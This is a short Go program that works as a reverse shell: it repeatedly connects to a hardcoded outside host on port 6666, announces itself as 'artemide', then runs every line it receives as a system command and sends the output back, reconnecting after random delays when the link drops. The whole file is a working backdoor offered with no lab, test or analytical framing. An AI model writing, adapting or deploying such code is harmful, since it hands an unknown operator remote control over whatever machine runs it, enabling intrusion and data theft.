package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/bogdanovich/dns_resolver"
)

const (
	HOSTPORT = "6666"
	HOSTNAME = "silvergeko.it"
	CONNTYPE = "tcp"
	NAME     = "artemide"
)

func main() {
	for {
		rtime := time.Duration(random(1, 100))
		conn, err := net.Dial(CONNTYPE, getIP(HOSTNAME)+":"+HOSTPORT)
		if err != nil {
			time.Sleep(rtime * time.Second)
			continue
		} else {
			conn.Write(toByte(NAME))
			fmt.Println("Connected...")
			for {
				message, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					time.Sleep(rtime * time.Second)
					break
				}
				if strings.Compare(string(message), "quit\n") == 0 {
					os.Exit(0)
				}
				out, err := execCmd(message)
				fmt.Println(len(out))
				if err != nil {
					fmt.Println("Errore")
					errText := fmt.Sprintf("%s", err)
					conn.Write(toByte(errText))
				}
				if len(out) == 0 {
					conn.Write(toByte("Eseguito"))
				} else {
					conn.Write(out)
				}

			}
		}

	}

}

func random(min, max int) int {
	rand.Seed(time.Now().Unix())
	return rand.Intn(max-min) + min
}

func getIP(hostname string) string {
	resolver := dns_resolver.New([]string{"8.8.8.8", "8.8.4.4"})
	resolver.RetryTimes = 5

	ip, err := resolver.LookupHost(hostname)
	if err != nil {
		log.Fatal(err.Error())
	}
	return ip[0].String()
}

func execCmd(command string) ([]byte, error) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:len(parts)]
	out, err := exec.Command(head, parts...).Output()
	return out, err
}

func toByte(f string, args ...interface{}) []byte {
	return []byte(fmt.Sprintf(f, args...))
}
